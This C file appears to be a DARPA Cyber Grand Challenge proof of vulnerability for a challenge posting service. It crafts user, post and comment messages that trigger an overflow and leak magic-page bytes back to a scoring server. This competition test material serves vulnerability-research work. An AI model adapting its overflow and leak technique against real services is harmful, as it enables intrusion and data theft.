/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libcgc.h>
#include "stdlib.h"
#include "stdio.h"
#include "string.h"

int receive_bytes (int fd, void *buffer, size_t count) 
{
size_t total;
size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }

    }

return 0;

}


int main(void)
{

char buffer[1024];
int i;

int pov_type;
unsigned int type2_addr;
unsigned int type2_length;
unsigned int type2_size;
unsigned int new_offset_value;

int retcode;
unsigned int userCode;
unsigned int postID;

	// negotiate a type 2 POV
	pov_type = 2;

	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
		_terminate(-1);


	*(unsigned int *)buffer = 0xa0;

	buffer[4] = 5;

	for (i=5; i < 149; ++i )
		buffer[i] = 'a';

	buffer[10] = 1;

	buffer[12] = 138;

	buffer[149] = 2;
	buffer[150] = 1;


	// send the message to add the user
	write(STDOUT, (void *)buffer, 151);

	receive_bytes(STDIN, &retcode, 4);

	if (retcode != 0) {

		printf("something is wrong\n");
		_terminate(-1);
	}

	buffer[12] = 1;

	// now add a bunch of users to move the read pointer of the file mapped to the magic page towards the end
	for (i = 0; i < 180; ++i ) {

		sprintf(buffer+7, "$03d", i);
		buffer[10] = 1;

		write(STDOUT, (void *)buffer, 14);

		receive_bytes(STDIN, &retcode, 4);

		if (retcode != 0) {

			printf("something is wrong\n");
			_terminate(-1);
		}
	}

	// now login as the first user
	buffer[0] = 0xb0;
	buffer[4] = 5;

	for (i=5; i < 12; ++i )
		buffer[i] = 'a';

	buffer[10] = 1;

	// send the message to login the user
	write(STDOUT, (void *)buffer, 12);

	// need to save the returned userCode for making posts
	receive_bytes(STDIN, &userCode, 4);


	// time to make a first post
	buffer[0] = 0xd0;

	*(unsigned int *)(buffer+4) = userCode;

	// short n sweet message
	buffer[8] = 1;
	buffer[9] = 'a';

	// send the message to make a post
	write(STDOUT, (void *)buffer, 10);

	// return code is the post's ID
	receive_bytes(STDIN, &postID, 4);


	// now make a comment on the post
	buffer[0] = 0xe0;

	*(unsigned int *)(buffer+4) = postID;
	*(unsigned int *)(buffer+8) = userCode;

	buffer[12] = 1;
	buffer[13] = 'b';

	write(STDOUT, (void *)buffer, 14);

	// get the response to the comment
	receive_bytes(STDIN, &retcode, 4);

	if (retcode != 0 ) {

		write(2, "comment error\n", 14);
	}

	// now request the specific message to get its comments, which should cause the overflow
	buffer[0] = 0xf0;

	*(unsigned int *)(buffer+4) = postID;

	write(STDOUT, (void *)buffer, 8);


	// receive the first part of the response
	receive_bytes(STDIN, buffer, 43);

	retcode = 0x8a;
	// now receive the length of the commenter's name.  If its only 30 bytes, then this is the patched binary
	receive_bytes(STDIN, &retcode, 4);

	if ( retcode == 0x8a ) {

		write(2, "exploited", 9);
		receive_bytes(STDIN, buffer, 0x8a+5+8+8);
		receive_bytes(STDIN, buffer, 54);
	}
	else {

		write(2, "patched binary\n", 15);
	}

	// now write the returned data back to the POV server for scoring
	write(3, buffer+50, 4);

	// send the command to exit the CB
	write(STDOUT, "exit", 4);

}

